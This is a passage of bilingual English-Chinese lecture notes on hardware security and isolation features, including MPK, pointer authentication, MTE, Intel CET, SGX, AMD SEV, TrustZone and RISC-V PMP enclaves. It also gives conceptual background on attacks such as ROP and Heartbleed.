id="arms-similar-functionalities">ARM’s Similar Functionalities</h4><ul><li>PAN: Privileged Access Never</li><li>PXN: Privileged execute Never</li><li>UAO: User Access Only</li></ul><h4 id="using-smap-for-intra-process-isolation">Using SMAP forIntra-process Isolation</h4><ul><li>Scenario: information hiding</li><li>Observation: SMAP prevents kernel access user’s memory</li><li>Idea: use SMAP to hide data from the rest of the process</li><li>Solution: put critical part in ring-3 and rest of the process inring-0</li><li>Challenge: how to securely run user code in ring-0?</li></ul><h3 id="mpx-mpk">MPX &amp; MPK</h3><p>Bounds Error of Software: C/C++ programs are prone to boundserrors.</p><ul><li>not type-safe language</li><li>buffer overflow bugs</li></ul><h4 id="mpx">MPX</h4><p>memory protection extensions</p><p>Intel introduces MPX since Skylake</p><p>Programmer can create and enforce bounds</p><ul><li>specified by two 64-bit addresses specifying the beginning and theend of a range</li><li>New instructions are introduced to efficiently compare a given valueagainst the bounds, raising an exception when the value does not fallwithin the permitted range</li></ul><p>Instructions:</p><ul><li>bndmov: Fetch the bounds information (upper and lower)out of memoryand put it in a bounds register.(有专门的寄存器来储存边界值)</li><li>bndcl: Check the lower bounds against an argument(%rax)</li><li>bndcu: Check the upper bounds against an argument (%rax)</li><li>bnd retq: Not a “true” Intel MPX instruction<ul><li>The bnd here is a prefix to a normal retq instruction</li><li>It just lets the processor know that this is Intel MPX-instrumentedcode</li></ul></li></ul><p>Bounds Tables For efficiency, four bounds can be stored intodedicated registers</p><ul><li>Registers: bnd0 to bnd3</li><li>When more bounds are required, they are stored in memory, and thebound registers serve as a caching mechanism</li><li>Bounds tables are a two-level radix tree, indexed by the virtualaddress of the pointer for which you want to load/store the bounds</li><li>The BNDLDX/BNDSTX instructions essentially take a pointer value andmove the bounds information between a bounds register &amp; boundstables</li></ul><p>最坏情况下内存overhead 500%，开销很大</p><p>大量指针同时进行 bound check使性能变差</p><p>在编译的时候设置一些flags来使用</p><h4 id="mpk">MPK</h4><p>memory protection keys</p><ul><li>with MPK, every page belongs to one of 16 domains, a domain isdetermined by 4 bits in every page-table entry(referred to as theprotection key)</li><li>for every domain, there are two bits in a special register(pkru)denotes whether pages associated with that key can be read orwritten</li><li>kernel and application<ul><li>only the kernel can change the key of a page</li><li>Application can read and write the pkru register using the rdpkruand wrpkru instructions respectively</li></ul></li></ul><p>整个内存区域被分为16个domain，有对应ID,写进页表里，通过pkru控制这些domain读写权限</p><p>初衷是在进程内做细粒度的内存权限管理</p><ul><li>Isolation can be enabled using MPK by placing the sensitive data inpages that have a particular protection key, forming the sensitivedomain .</li><li>An appropriate instrumentation enables reads and/or writes to thedata by setting the access disable and write-disable bits, respectively,using wrpkru<ul><li>As long as these bits are unset, the sensitive domain isaccessible</li><li>By setting the bits back, the sensitive domain is disabled, makingonly the non- sensitive domain available</li></ul></li></ul><p>软件有mproject方法与之相似，application can already change thepermission of pages. MPK的优势在于mproject是一个systemcall,有性能损失，改内存权限要改页表和刷TLB，一个核改了其他核也要中断刷TLB，下一次访存会TLBmiss而使用MPK只需要执行几条指令，开销更小</p><p>应用场景：</p><ul><li>use case 1: protect critical data with one address space<ul><li>Handling of sensitive cryptographic data</li><li>Only enable access to private key during encryption</li></ul></li><li>use case 2: prevent data corruption<ul><li>In-memory database prevents writes most of the time</li><li>Only enable changing data when needs to change</li><li>Changing protection on gigabytes using mprotect() is too slow</li></ul></li></ul><p>保护关键数据，只有特定代码可以访问，或特定数据不会被corruption:大部分新的数据都在内存里，而不在磁盘里。所有人都可以访问容易导致错误。把MPK用在微内核。微内核性能差，用户态之间调用性能很差</p><h3 id="arm-pointer-authentication">ARM Pointer Authentication</h3><p>如何保证指针没有被修改？</p><p>ARM64 only use 40 bits out of 64 bits</p><ul><li>On an ARM64 Linux system using three-level page tables, only thebottom 40 bits are used, while the remaining 24 are equal to the highestsignificant bit</li><li>the 40-bit address is sign-extended to 64 bits</li><li>those uppermost bits could be put to other uses, including holdingan authentication code</li></ul><p>use the 24 bits for security!</p><p>把指针加一个tag，和一个密钥一起算出密文，存在前24个bits中</p><h4 id="key-management">Key Management</h4><p>PA defines five keys: Four keys for PAC<em>and AUT</em>instructions(combination of instruction/data and A/B keys), one key foruse with the general purpose PACGA instruction</p><p>Key storage:</p><ul><li>Stored in internal registers and are not accessible by EL0(usermode)</li><li>The software(EL1, EL2 and EK3) is required to witch keys betweenexception levels</li><li>Higher privilege levels control the keys for the lower privilegelevel</li></ul><p>指针加密，加密值存在前24个bits，加一条指令保护栈</p><h4 id="new-instructions">New instructions</h4><p>PAC value creation:</p><ul><li>Writee the value to the uppermost bits in a destination registeralongside and address pointer value</li></ul><p>Authentication:</p><ul><li>Validate a PAC and update the destination register with a correct orcorrupt address pointer</li><li>if the authentication fails, an indirect branch or load that usesthe authenticated, and corrupt, address will cause an exception</li></ul><p>remove a PAC value from the specified register</p><p>软件方法保护栈是在栈帧和栈帧之间插入一个随机数，return之前检查随机数看看有没有被篡改过，而用硬件的方法只需要在开头和结尾分别加一个PAC和AUT即可，提高性能</p><h4 id="target-memory-safety">Target: Memory Safety</h4><p>Memory safety violation dominates:</p><ul><li>Microsoft, Google,etc</li></ul><p>software solutions:</p><ul><li>ASan: AddressSanitizer</li><li>HWSAN: hardware-assisted AddressSanitizeer</li><li>Cons: costly</li></ul><p>Hardware solution: tagged memory</p><h4 id="arm-mte">ARM MTE</h4><p>memory test extension</p><p>memory safety空间错误(访存越界)&amp;时间错误(访问一个已经free的指针)</p><p>A new memory type: Normal Tagged Memory</p><p>loads and stores to this new memory type perform an access where thetag present in the top byte of the address register is compared with thetag stored in memory</p><p>A mismatch between the tag in the address and the tag memory can beconfigured to cause a synchronous exception or to be asynchronouslyreported</p><p>每16 bytes对应一个 1 byte tag 指针加一个tag 要求相邻的spacetag要不一致, malloc/free的时候要注意更新tag,这样malloc开销会变大，因为要初始化所有的tag(虽然可以异步执行)</p><h4 id="combining-mte-and-pa">Combining MTE and PA</h4><p>MTE和PA都用了24个闲置bits，</p><ul><li>a tag for memory tagging</li><li>a PAC for pointer authentication</li></ul><p>可以同时使用，PAC的大小是可变的，取决于virtual addressspace大小。同时使用的时候PA安全性会降低一点</p><p>这24个bit还能怎么用？Pump为每个memory设置等长的tag,每个memory对应的tag也可以是一个指针</p><h3 id="intel-cet">Intel CET</h3><p>control-flow Enforcement Technology</p><p>Two major techs:</p><ul><li>Shadow stack</li><li>Indirect branch tracking</li></ul><p>核心思想是改变代码的控制流，包括两种方式，</p><h4 id="code-injection-attacks">code injection attacks</h4><p>即在内存中注入一段恶意代码，试着将return address覆盖掉，并跳转到恶意代码段</p><ul><li>inject malicious code in buffer</li><li>Overwrite return address to buffer</li><li>Once return, the malicious code runs</li></ul><p>Solutions:</p><ul><li>StackGuard, FormatGuard</li><li>make data section non-executable</li></ul><p>New Attacks: Code-reuse Attack</p><ul><li>return-to-libc &amp; return-oriented programming</li></ul><h4 id="code-reuse-attack">Code Reuse Attack</h4><p>不需要注入新的代码，而是跳转到已有代码，找到若干个代码片段，在returnaddress里压入若干个地址把这些片段串起来</p><p>Return-oriented Programming</p><ul><li>Find code gadgets in existed code base</li><li>push address of gadgets on stack</li><li>leverage ‘ret’ at the end of gadget to connect each codegadgets</li><li>No code injection</li></ul><p>Solutions:</p><ul><li>return-less kernels</li><li>Heuristic means</li></ul><p>New: Jump-oriented attacks</p><ul><li>Use gadget as dispatcher</li></ul><h4 id="cfi">CFI</h4><p>control-flow integrity</p><p>General Solution to enforce CFI</p><ul><li>Some need binary re-writing or source re-compiling</li><li>Some need application/OS/Hardware re-designing</li><li>Some have large overhead</li></ul><p>Challenges:</p><ul><li>Non-instrusive general attack detection</li><li>Apply to existing applications on commodity hardware</li></ul><h4 id="shadow-stack">shadow stack</h4><p>A shadow stack is a second stack for the program</p><ul><li>Used exclusively for control transfer operations</li><li>Is separate from the data stack</li><li>Can be enabled for operation individually in user mode or supervisormode</li></ul><p>给程序加一个shadow stack，只记录调用trace，和数据分开，stackoverflow就无法攻击</p><h4 id="shadow-stack-mode">Shadow Stack Mode</h4><p>CALL instruction</p><ul><li>Pushes the return address on both the data and shadow stack</li></ul><p>RET instruction</p><ul><li>Pops the return address from both stacks and compare them</li><li>If the return addresses from two stacks do not match, the processorsignals a control protection exception</li></ul><p>Note that the shadow stack only holds the return addresses and notparameters passed to the call instruction</p><p>这样软件需要维护两个栈，开销比较大，可以用用户态维护也可以由内核态维护，用户态维护的话每次call和return之前都要去另外的地方记录一下，内核态维护可以把shadowstack放到内核态，比较安全但是每次call和return都需要systemcall，考虑用硬件来做</p><h4 id="protecting-the-shadow-stack">Protecting the Shadow Stack</h4><p>The shadow stack is protected by page table</p><ul><li>Page tables support a new attribute: mark page as “Shadow Stack”pages依然属于用户态，但是不能被一般指令访问</li></ul><p>Control transfers are allowed to store return addresses to the shadowstack</p><ul><li>Like near call, far call, call to interrupt/exception handlers,etc.</li><li>However stores from instructions like MOV, XSAVE, etc. will not beallowed</li></ul><p>When control transfer instructions attempt to read from the shadowstack</p><ul><li>Access will fault if the underlying page is not marked as a “ShadowStack” page</li></ul><p>Detects and prevents conditions that cause an overflow or underflowof the shadow stack or any malicious attempts to redirect the processorto consume data from addresses that are not shadow stack addresses</p><h4 id="indirect-branch-tracking">Indirect Branch Tracking</h4><p>new instruction: ENDBRANCH在jump的时候检查</p><ul><li>mark valid indirect call/jmp targets in the programjmp地址必须是一个ENDBRANCH</li><li>Becomes a NOP on legacyprocessor，在不支持这一指令的CPU上会变成NOP指令，保证兼容性</li><li>On processors that suport CET the ENDBRANCH is still a NOP and isprimarily pipeline to detect control flow violations</li></ul><h4 id="wait_for_-endbranch-state">WAIT_FOR_ ENDBRANCH State</h4><p>The CPU implements a state machine that tracks indirect jimp andcall</p><ul><li><p>When one of these instructions is seen, the state machine movesfrom IDLE to WAIT_FOR_ ENDBRANCH state</p></li><li><p>In WAIT_FOR_ _ENDBRANCH state the next instruction in the programstream must be an ENDBRANCH</p></li><li><p>If an ENDBRANCH is not seen the processor causes a controlprotection fault else the state machine moves back to IDLEstate</p></li></ul><p>为了这个指令加入一个WAIT_FOR_ENDBRANCHState，进入jmp指令的时候进入这个状态。如果jmp一半发生中断，中断恢复的时候要注意保存状态</p><p>ARM上有类似的指令BTI(Branch Target Instructions)BR—-&gt; jmp toBTI，指定了落脚点。缺点是BTI依然很多，但正确的只有一个，需要更细粒度的CFI，这部分软件实现起来比较方便</p><h3 id="isolated-execution-environment">Isolated ExecutionEnvironment</h3><p>能不能把bug带来的影响降到最低</p><h4 id="background-heartbleed-attack">Background: HeartBleed Attack</h4><p>In-application memory disclosure attack</p><ul><li>one over-read bug discloses the whole memory data</li></ul><p>在实现TLS心跳协议时没有对输入进行适当验证，缺少边界检查，读取的数据比应该允许读取的还多。连接的一段可以发一个特定类型的heartbeat请求包给对方，里面携带最长64kb的数据，对方收到后把数据原样返回，完成检测，发送请求的客户端可以故意声明自己携带了很长的数据而实际上不带任何数据，服务器不会检查请求中声明的数据和实际数据大小，而是直接按照这个长度用memcpy从请求数据中复制，也就是实际复制的是内存中紧跟在请求数据后面的这一段空间的数据。</p><p>解决思路：把应用程序代码放到两台虚拟机中执行，一台执行普通代码一台执行加密代码</p><h3 id="virtual-machine">Virtual Machine</h3><p>虚拟化有VMX root/VMX non-root mode, 切换通过VM entry和VM exit实现</p><p>VM Entry:</p><ul><li>Transition from VMM to Guest</li><li>Enters VMX non-root operation</li><li>Loads Guest state from VMCS</li><li>VMLAUNCH used on initial entry</li><li>VMRESUME used on subsequent entries</li></ul><p>VM Exit:</p><ul><li>VMEXIT instruction used on transition from Guest to VMM</li><li>Enters VMX root operation</li><li>Saves Guest state in VMCS</li><li>Loads VMM state from VMCS</li></ul><p>在这一过程中使用的页表多了一个Extended Page Table(EPT)</p><ul><li><p>Translate guest physical addr to host physical addr, thetwo-level translation are all done by hardware</p><p>Guest Virtual Address(GVA)—Guest page table—&gt;Guest PhysicalAddress(GPA) —EPT—&gt;Host Physical Address(HPA)</p></li><li><p>EPT is manipulated and maintained by hypervisor</p><ul><li>Hypervisor controls how guest accesses physical addresss</li><li>any EPT violation triggers VMExit to hypervisor</li></ul></li></ul><p>所以其实有两个CR3，一个指向guest page table,一个指向EPT</p><p>如何通过两个虚拟机跑一个进程的两段代码？在一台虚拟机上维护两张页表Main EPT和Secret EPT</p><h4 id="memory-isolation-using-ept-mechanism">Memory Isolation using EPTMechanism</h4><p>Leverage EPT mechanism to shadow secret memory</p><ul><li>Data segment: secret memory is removed from main EPT</li><li>Code segment: sensitive functions only exist in secret EPT</li></ul><p>关键数据和代码都只在secretEPT里映射，问题转化为如何高效地做页表切换</p><p>问题：context switch开销很大:</p><ul><li>Every EPT switch is intervened by hypervisor</li><li>VMExit takes much more time than function call</li></ul><p>使用VMFUNC特性，不需要hypervisor切换页表</p><h4 id="vm-functionvmfunc101">VM Function(VMFUNC)101</h4><p>允许一个虚拟机配置若干个EPT并在non-root情况下切换</p><p>VM Functions: Intel virtualization extension</p><ul><li>Non-root guest VMs can directly invoke some functions withoutVMExit</li></ul><p>VM Function 0: EPTP Switching</p><ul><li>Software in guest VM can directly load a new EPT pointer</li></ul><p>VMFUNC can provide the hypervosor-level function at the cost ofsystem calls</p><h4 id="using-vmfunc-for-efficiency">Using VMFUNC for Efficiency</h4><p>Separate control plane from data plane</p><ul><li>control plane: hypervisor pre-configure the EPT used by differentcompartments</li><li>data plane: application can directly switch EPT without yhypervisorintervention</li></ul><p>EPTP switching invocation: VMFUNC opcode (EAX=0, ECX=EPTP_index)</p><p>一个虚拟机切换了页表后hypervisor并不知道切换了页表，可能导致错误，需要补足信息缺失，同时，由于VMFUNC可以在用户态运行，因此要防止恶意攻击者随意调用VMFUNC</p><h4 id="security-problem-of-vmfunc">Security Problem of VMFUNC</h4><p>What if attackers directly switch EPT?</p><ul><li>Since EPT switching is not checked by hypervisor</li></ul><p>Recall: the code segment of the secret compartment</p><ul><li>It only contains trusted sensitive functions</li><li>The legal entrances to the secret compartment arefixed合法入口是固定的，只有这个地方可以调用VMFUNC</li><li>Invalid VMFUNC invocation causes EPT violation</li></ul><h4 id="secret-compartment-is-not-self-contained">Secret Compartment isnot self-contained</h4><ul><li>main compartment may invoke sensitive functions</li><li>Secret compartment may invoke normal functions</li><li>Different compartments have different context</li><li>main compartment通过Trampoline切换为secretcompartment执行敏感代码再切换回去</li><li>secret compartment通过springboard切换为maincompartment调用lib_call再切换回去</li><li>Context switch is done using VMFUNC</li></ul><p>Application Decomposition in SeCage</p><p>A hybrid approach to decomposing application</p><ul><li>Dynamic approach to extracting the secret closure</li><li>Automatic decomposition during compilation time</li><li>Static approach to getting the complete potential secret datafunctions, used to avoid corner case during runtime</li></ul><h2 id="features-for-isolation">Features for Isolation</h2><h3 id="arm-trustzone">ARM Trustzone</h3><p>Two Modes</p><ul><li>Normal world(REE, rich execution environment) and secure world(TEE,trusted execution environment)</li><li>isolated with each other</li><li>SMC instruction to switch</li></ul><p>可以把trustzone看成两个虚拟机，区别在于smc的功能并不像thypervisor那么多，逻辑比较简单</p><h4 id="different-levels-of-trust">Different levels of trust</h4><ul><li>Secure Domain(Tamper-proof, isolated) High security, limitedfuncs</li><li>Trusted Domain(TrustZone and TEE)</li><li>Protected Domain(Hypervisor) Secure, but more complex</li><li>Rich Domain(Android or Linux) Not secure,but flexible</li></ul><h4 id="trustzone-usage-in-phones">TrustZone Usage: in Phones</h4><p>TEE has become standard for biometric</p><ul><li>TEE for fingerprint registration, storage and attestation</li><li>Keep secure even if the phone is rooted</li></ul><h4 id="trustzone-usage-in-vehicle">TrustZone Usage: in Vehicle</h4><p>Secure Authentication:</p><ul><li>start through fingerprint</li><li>secure payment for digital content,oil,etc</li></ul><p>Secure connection</p><ul><li>Internet: Through SoftSIM to switch between carriers</li><li>Connection with smartphone for unlocking and remote controlling</li></ul><p>Isolation with Entertainment</p><ul><li>Use TEE for secure authentication and connection</li></ul><h4 id="trustzone-usage-in-drones">TrustZone Usage: in Drones</h4><p>Secure Control Policies</p><ul><li>No-fly zone: using GPS to restrict fly zone through TEE</li><li>Owner authentication: using biometrics on remote controller</li><li>Other fly-policies: return to specific spot under certainconditions</li></ul><p>Secure Enforcement</p><ul><li>Enforce policies through secure boot/secure storage</li><li>Tamper-resistant even under physical attacks</li></ul><h4 id="current-eco-system-of-tee">Current Eco-system of TEE</h4><p>Fragmentation of TEE</p><ul><li>From chip venders: QualComm, Spetrum</li><li>From phone venders: Apple, Huawei</li><li>TEE OS venders: TrustKernel, Trustonic, Google, Linaro</li><li>Many other implementations based on OP-TEE</li></ul><p>Trusted applications:</p><ul><li>must be ported to each TEE OS</li><li>have to trust the underlying TEE OS</li></ul><h4 id="trustzone-based-real-time-kernel-protection">TrustZone-basedReal-time Kernel Protection</h4><p>Event-driven monitor</p><ul><li>Monitor the normal world critical events</li></ul><p>Memory protection</p><ul><li>Protect critical parts of the normal world memory</li></ul><p>Goals</p><ul><li>Prevent unauthorized privileged code on the target system</li><li>Prevent kernel data access by user level processes</li></ul><h3 id="intel-sgx">Intel SGX</h3><h4 id="why-intel-sgx">Why Intel SGX?</h4><p>Motivation: untrusted privileged software</p><ul><li>protect application from untrusted OS</li></ul><p>What if the OS direct accesses application’s memory?</p><ul><li>Data are encrypted in memory</li><li>Data can only be accessed by the app within CPU boundary</li><li>The TCB contains only the CPU app, no OS</li></ul><p>首次在商用处理器上引入内存加密，攻击者通过物理手段偷取数据很难(嗅探内存总线，拔下NVRAM读数据)需要直接读取CPU才能得到数据</p><h4 id="how-can-memory-always-be-encrypted">How can Memory Always beEncrypted?</h4><p>Question: data will eventually be decrypted when using</p><ul><li>Then, what if an attacker steal data when it is being used</li></ul><p>Solution: only decrypt data inside CPU(in cache)</p><ul><li>The attacker now has to steal data directly from CPU</li></ul><h4 id="counter-mode-encryption">Counter-mode Encryption</h4><p>有两个cache,分别是data cache和countercache不直接对数据做加解密，而是对counter做。每个cacheline对应一个counter，数据加密其实是对数据对应的counter做加密。VM-key对counter做加密，生成一个PAD。这个PAD再和data做一次XOR运算作为最终密文,因为XOR比较快</p><p>为什么是安全的？因为counter值是随机的，而且每次写内存counter都会+1,一直是变化的</p><h4 id="merkel-tree-for-data-integrity">Merkel Tree for DataIntegrity</h4><p>对所有的data和counter做一个哈希，对哈希值再次哈希，一路往上变成一个rootof hash tree放在CPU里，攻击者无法修改</p><p>性能比较差，写一次要多次哈希，哈希树不能太深，内存不能太大。128MB–&gt;改善后256MB</p><h4 id="process-view">Process View</h4><ul><li>With its own code and data</li><li>Providing Confidentiality &amp; Integrity</li><li>Controlled entry points</li><li>Multi-thread support</li><li>Full access to app memory and processor performance</li></ul><p>protected execution environment embedded in a process</p><h4 id="sgx-execution-flow">SGX Execution Flow</h4><ul><li>App built with trusted and untrusted parts</li><li>App runs &amp; creates the enclaves which is placed in trustedmemory</li><li>Trusted function is called, execution transitioned to theenclave此时call的时候要必须通过call gate限制跳转范围</li><li>Enclave sees all process data in clear; external access to enclavedata is denied</li><li>Trusted function returns; enclave data remains in trustedmemory</li><li>Application continues normal execution</li></ul><p>怎么使用？</p><h4 id="software-architectures-of-sgx">Software Architectures ofSGX</h4><ul><li>Code Snippet只把APP trusted part放进enclaves</li><li>Application 把整个app和LibCinterface放进SGX，好处是app不需要修改，缺点是不能很好保证安全性，libC向外传参是明文还是密文？</li><li>Container把LibC也加进来，systemcall才出去，但如果OS也是恶意的呢？</li><li>LibOS 把LibOS也放进来，把常用systemcall封装成一个OS放进来，外面是virtual machine级别</li></ul><h3 id="amd-sme-intel-tme">AMD SME &amp; INTEL TME</h3><h4 id="amd-x86-memory-encryption-technologies">AMD x86 MemoryEncryption Technologies</h4><p>Two Technologies:</p><ul><li>AMD Secure Memory Encryption(SME)</li><li>AMD Secure Encrypted Virtualization(SEV)</li></ul><p>Features</p><ul><li>Hardware AES engine located in the memory controller performs inlineencryption and decryption of DRAM</li><li>Minimal performance impact: Extra latency only taken for encryptedpages</li><li>No application changes required</li><li>Encryption keys are managed by the AMD Secure Processor and arehardware isolated. Not known to any software on the CPU</li></ul><p>页表第47位设为0不加密，设为1为加密，对软件完全透明。依赖于OS,防硬件不防软件</p><h4 id="comparing-with-intel-sgx">Comparing with Intel SGX</h4><p>The SME approach is different</p><ul><li>It will not protect memory from an attacker who has compromised thekernel</li><li>It is intended to protect against cold- boot attacks, snooping onthe memory bus, and the disclosure of transient data stored inpersistent-memory arrays</li></ul><h4 id="intel-mktme-multi-key-tme">Intel MKTME: Multi-Key TME</h4><p>配置多个key,既可以从hard generated临时的key,也可以用 softwareprovidedkey，适用于NVRAM重启后仍然想知道里面的数据(SGX这样纯硬件生成的重启后就不知道Key了，无法解密)Multi-Key Total Memory Encryption (MKTME)</p><ul><li>A fixed number of encryption keys are supported</li><li>This functionality is available on a per-page basis</li></ul><p>Uses the hardware- generated ephemeral key</p><ul><li>Inaccessible by software or external interfaces</li></ul><p>MKTME also supports software-provided keys</p><ul><li>E.g.. a hypervisor can manage the keys to transparently providememory encryption support for legacy OSes</li><li>OS can also use MKTME to provide support in native and virtualizedenvironment</li></ul><p>不同的VM可以有多个KeyID的内存区域，通过具有相同keyID的内存区域进行交互</p><h3 id="amd-sev">AMD SEV</h3><h4 id="threat-model-of-public-cloud">Threat Model of Public Cloud</h4><p>Isolation between co-resident VMs provided by hypervisor sometimesbreaks down:</p><ul><li>QEMU “VENOM”, VirtualBox bug, etc.</li></ul><p>Cloud vendors and hypervisor they provide can not be trusted</p><ul><li>Hypervisor has full access to guest secrets in memory</li><li>Not ideal for cloud users</li></ul><p>AMD SEV assumes no side channel attacks or integrity compromise</p><h4 id="design-of-sev">Design of SEV</h4><p>SEV adds an encryption engine in memory controller for encryption</p><ul><li>Encryption engine encrypts data using corresponding key</li><li>Encryption key is selected by secure processor</li></ul><p>SEV adds a secure processor for key management</p><p>DRAM里面是加密的，靠SOC里的Key进行保护，guest owner把自己的VM加密之后VM只能运行在SEV里面并且以加密方式运行。hypervisor只能偷到密文</p><h4 id="limitation-of-amd-sme">Limitation of AMD SME</h4><p>Vulnerable to side channel attacks</p><ul><li>Cache side channel, TLB side channel, etc.</li></ul><p>No guarantee of integrity</p><ul><li>Vulnerable to extend page table remap attack</li><li>VuInerable to physically rewrite to DRAM</li></ul><p>Limited number of encryption keys</p><ul><li>Encryption key is associated with ASID</li><li>Number of ASID is limited in secure processor</li></ul><p>encryptionkey数量有限，能起的虚拟机数量有限。为了解决这个问题提出SMP，其中一个很重要的数据结构是RMP</p><h4 id="rmp-reverse-map-table">RMP: Reverse Map Table</h4><p>Memory integrity is enforced using a new DRAM structure called theReverse Map Table (RMP)</p><p>There is 1 RMP for the entire system, it is created by softwareduring boot</p><p>Basic properties:</p><ul><li>RMP contains 1 entry for every 4k of assignable memory Hypervisorpage</li><li>RMP is indexed by System Physical Address (SPA)</li><li>RMP entries may only be manipulated via new x86 instructions</li></ul><p>The RMP indicates page ownership and dictates write-ability.Examples:</p><ul><li>A page assigned to a guest is only writeable by that guest</li><li>A page assigned to the hypervisor cannot be used as a private(encrypted) guest page</li><li>A page used by AMD firmware cannot be written by any x86software</li></ul><p>RMP记录的是physical memory到virtual memory之间的映射关系，又叫pageownership</p><p>加了一条新指令PVALIDATE，guest可以对每个加到自己地址空间里的内存做VALIDATE操作，加进来之后会写RMP。guest执行PVALIDATE，硬件会把RMP设置好。如果hypervisor把mapping改了，此时guest并不知情，再去访问这块内存就会报错，可以保证hypervisor对页表的监控</p><h4 id="why-tee-virtualization">Why TEE Virtualization?</h4><p>能否对TrustZone做虚拟化，使得里面可以跑多个Trust OS和对应的App?</p><ul><li>before 2021: A fixed piece of code by venders</li><li>2012-2017: Some pre-installed trusted apps(TAs) by venders</li><li>2017-now: Support dynamic installation of third party TAs</li></ul><h4 id="why-multiple-isolated-tees-are-needed">Why multiple isolatedTEEs are needed?</h4><ul><li>More and more CVEs of TEE OS and TAs are disclosed</li><li>A compromised TEE may breach the entire system</li><li>APP vendors(e.g.,mobile payment) may compensate users for the faultsof TEE OS, thuus they prefer to run on TEEs the trust</li></ul><h4 id="cve-example-the-boomerang-attack">CVE Example: The BoomerangAttack</h4><p>A time service running in the secure world.</p><ul><li>Writing current time to a memory address (as parameter)</li></ul><p>The bug: no check on the address→arbitrary memory writes to REE</p><ul><li>Recall that TEE has higher privilege than REE</li><li>Similar bugs exist in QualComm, Trustonic, SierrawareTEE, Huawei,OP-TEE</li></ul><p>降低TEE权限</p><h4 id="teev-enabling-multiple-virtualized-tees">TEEv: Enabling MultipleVirtualized TEEs</h4><p>在一个CPU内运行多个TEE,这些vTEE可以是不同厂商的</p><p>interaction between vTEEs &amp; vTEE/REE</p><ul><li>secure communication channel by TEE-visor<ul><li>TEE-visor manages the shared memry pages between vTEEs andvTEE/REE</li><li>Memory pages in one context need to be explicitly other context</li></ul></li><li>Defend Boomerang attack</li></ul><h3 id="pmp">PMP</h3><h4 id="hardware-property-pmp">Hardware Property: PMP</h4><p>RISC-V平台的隔离技术，physical memory protection</p><p>Secure monitor only ensure memory isolation when creating enclave</p><ul><li>Keystone use PMP to ensure memory isolation during execution</li></ul><p>N (typically 8) groups of PMP registers</p><ul><li>Each group configures access permission to a specific piece ofcontinuous physical memory</li></ul><p>Hardware check during memory access</p><ul><li><p>Hardware will look up the first PMP register group whose memoryregion contains destination address (from0 to N)</p></li><li><p>Check access permission according to first found PMPregister</p></li></ul><p>Each enclave will be assigned a group of PMP registers, indicatesmemory region allocated to enclave</p><p>pmpN is assigned to OS by secure monitor in default, so OS can onlyaccess memory after the address passes the check of all enclave’scheck</p><p>After enclave creation, the physical memory is divided into severalindependent memory region, each belongs to one enclave</p><p>total number of enclaves is limited, because the number of PMPregister is limited</p><h4 id="limitations-of-pmp">Limitations of PMP</h4><p>Vulnerable to physical attacks</p><ul><li>Bus snooping, cold boot attack, etc.</li></ul><p>Not support dynamically allocating new memory for enclave</p><ul><li><p>Enclave’s memory region can only be set during enclavecreation</p></li><li><p>This is limited by hardware PMP’s design</p></li></ul><p>Limited number of enclave supported simultaneously</p><h4 id="motivation-of-spmp">Motivation of sPMP</h4><p>For loT devices(MMU-less). It is desirable to enable S-mode OS tolimit the physical addresses accessible by U-mode software</p><p>之前的PMP是monitor mode,是 RISC-V平台特有的权限，非常底层</p><p>M-mode PMP virtualization is non-secure, S-mode virtualization forscalable enclaves</p><h4 id="penglai">Penglai</h4><p>在machine mode里做了一个secure monitor，负责Enclavemanagement，包括创建enclave等，user态有enclave APP, Enclaveservice如FS等 ，主要工作在于secure communnication channel</p><h4 id="fine-grained-memory-isolation">Fine-grained MemoryIsolation</h4><p>Naive way</p><p>1-bit tag for memory isolation</p><ul><li><p>Secure monitor reserves a bitmap in DRAM and protects it viaPMP</p></li><li><p>Each bit in bitmap corresponds to one physical page and indicatewhether the page is enclave page</p></li><li><p>CPU checks corresponding bit in bitmap before accessing certainphysical page to prohibit kernel from accessing enclave memory</p></li></ul><p>对性能影响和硬件改动比较大 Cons:</p><ul><li><p>Too much modification to hardware</p></li><li><p>CPU extension introduces one extra memory access for queryingbitmap</p></li><li><p>Overhead can be alleviated via tag cache but can not be mitigatedand introduces more modification</p></li></ul><p>Hardware Solution</p><ul><li><p>All unsecure page tables are stored in a reserved memory region(PT_ AREA). New hardware feature is added in page table walker(PTW)</p></li><li><p>PT_ AREA is isolated from kernel by PMP</p></li><li><p>Kernel is still in charge of memory mappings but can not writePT_ AREA directly</p></li><li><p>Secure monitor helps kernel set page table entry and checkmalicious mappings</p></li><li><p>Minor modification to hardware (only some comparing logic in pagetable walker)</p></li><li><p>No extra memory access overhead during applicationexecution</p></li></ul><p>It achieves:</p><ul><li>G1: Non-enclaves cannot access secure pages</li><li>G2: Fine-grained memory isolation without static partitioning</li></ul><h4 id="temporally-cache-partition">Temporally Cache Partition</h4><p>Penglai uses cache partition mechanism to alleviate side channel</p><p>Partition cache when current CPU issues certain instruction</p><ul><li>CPU can still read/write all cache lines but can only evict cachelines allocated to it</li></ul><p>Cancel the partition via certain instruction</p><p>Most of time the whole cache is shared among CPUs</p><h4 id="fast-ipc">Fast IPC</h4><ul><li><p>Secure monitor allows an enclave to register itself as a serverwith certain name</p></li><li><p>Then secure monitor will bind the server enclave with itsname</p></li><li><p>Other enclaves can request secure monitor for handle of serverenclave with certain name</p></li><li><p>Then it can call server enclave with the handle</p></li><li><p>Penglai supports both host- enclave IPC and enclave - enclaveIPC</p></li><li><p>Penglai supports fast ownership transfer between host and enclavevia unmapping pages in PT AREA, marking enclave pages and remapping themin enclave’s page table</p></li><li><p>Penglai supports fast ownership transfer between enclaves andenclave via unmapping and remapping pages in each enclave’s pagetable</p></li><li><p>When enclave call is finished, pages’ owner- ship transfer canalso happen in the opposite direction</p></li></ul><h2 id="features-not-for-security">Features NOT for Security</h2><h3 id="transactional-memory-101">Transactional Memory 101</h3><p>本来是给数据库和其他并发软件用的</p><p>Hardware TM to mass market</p><ul><li>Intel’s restricted transactional memory (RTM)</li><li>IBM’s IBM Blue Gene/Q</li><li>AMD advanced synchronization family (ASF proposal)</li></ul><p>Generally provides:</p><ul><li>Opportunistic concurrency</li><li>Strong atomicity: read set &amp; write set</li><li>Semantic of both all-or-nothing and before-or-after</li></ul><p>Real-world best - effort TM</p><ul><li>Limited read/write set</li><li>System events may abort an TX</li></ul><h3 id="using-htm-for-data-protection">Using HTM for DataProtection</h3><p>Idea: leverage the strong atomicity guarantee provided by HTM todefeat illegal concurrent accesses to the memory space that containssensitive data</p><ul><li>Each private- key computation is performed as an atomictransaction</li></ul><p>During the transaction</p><ul><li>Private key is first decrypted into plaintext,</li><li>Use to decrypt or sign messages</li><li>If the transaction is interrupted, the abort handler clears allupdated but 